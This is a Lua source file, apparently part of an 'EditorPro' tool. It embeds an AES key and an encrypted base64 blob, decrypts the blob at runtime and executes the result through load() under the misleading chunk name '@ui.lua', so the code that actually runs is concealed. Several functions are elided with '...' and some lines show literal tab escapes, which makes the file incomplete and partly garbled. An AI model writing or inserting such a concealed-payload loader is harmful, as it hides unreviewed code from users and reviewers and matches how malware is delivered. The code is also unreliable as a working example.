local KEY_HEX = "7b336fbe7864589537133163dbec8e235ddb653e0b563c92812729cc6558362d"
local BLOB = "+YB4tPj1j2tFepC1ada0A+yEHzUrG63a3HkvAjzPf88jN51v6Fke3k9Y/zz5hzTIhR0EG1kIr+LGqTfR4PeJ7xWnyH2ydPaoiGYaUjUby0o="

local function vf_b64dec(data)
\tlocal b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
\tdata = string.gsub(data, "[^" .. b .. "=]", "")
\treturn (data:gsub(".", function(x)
\t\tif x == "=" then return "" end
\t\tlocal f = (string.find(b, x, 1, true) or 1) - 1
\t\tlocal r = ""
...
local function vf_hex_to_bytes(h)
\tlocal t = {}
...
local function Queue_new()
	local q, o = {}, {}
	o.push = function(x) table.insert(q, x) end
	o.pop = function() return table.remove(q, 1) end
	return o
end

local XOR = function(a, b) return (a ~ b) % 256 end
...
local function vf_pkcs7_unpad(s)
	local n = #s
	if n == 0 then return s end
	local p = string.byte(s, n)
	if p < 1 or p > 16 then error("bad padding") end
	return string.sub(s, 1, n - p)
end

local function vf_decrypt_cbc(key32, iv_cipher)
	local key = Array.fromString(key32)
	assert(#key == 32)
	local iv = string.sub(iv_cipher, 1, 16)
	local ct = string.sub(iv_cipher, 17)
	assert(#ct % 16 == 0)
	local prev = Array.fromString(iv)
	local parts = {}
	for off = 1, #ct, 16 do
		local blk = string.sub(ct, off, off + 15)
		local ba = Array.fromString(blk)
		local dec = AES.decrypt(key, ba)
		local xored = Array.XOR(dec, prev)
		parts[#parts + 1] = Array.toString(xored)
		prev = ba
	end
	return vf_pkcs7_unpad(table.concat(parts))
end

return { decrypt_cbc = vf_decrypt_cbc }

end)()

local plain = Crypto.decrypt_cbc(vf_hex_to_bytes(KEY_HEX), vf_b64dec(BLOB))
local fn, err = load(plain, "@ui.lua")
if not fn then
	print("[EditorPro] " .. tostring(err))
else
	fn()
end
